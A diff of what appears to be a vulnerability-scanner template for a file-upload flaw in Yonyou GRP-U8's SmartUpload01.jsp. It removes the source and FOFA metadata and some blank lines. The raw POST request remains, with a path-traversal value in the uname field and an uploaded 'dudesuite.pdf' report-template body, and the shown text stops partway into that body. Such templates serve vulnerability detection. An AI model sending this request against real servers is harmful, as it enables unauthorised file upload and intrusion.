@@ -3,12 +3,8 @@ info:
   name: 用友GRP-U8 SmartUpload01 文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nv3dl70wemhgqgkh'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nv3dl70wemhgqgkh
-    fofa: app="用友-GRP-U8"
 http:
 - raw:
   - 'POST /u8qx/SmartUpload01.jsp HTTP/1.1
@@ -17,14 +13,10 @@ http:
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzhvrkrqt
 
 
-
-
     ------WebKitFormBoundaryzhvrkrqt
 
 
     Content-Disposition: form-data; name="uname"
-
-
 
 
     ../../../../../../../../../dudesuite
@@ -34,8 +26,6 @@ http:
 
 
     Content-Disposition: form-data; name="input_localfile"; filename="dudesuite.pdf"
-
-
 
 
     <jatools Class="jatools.ReportDocument" Name="jatools report template">
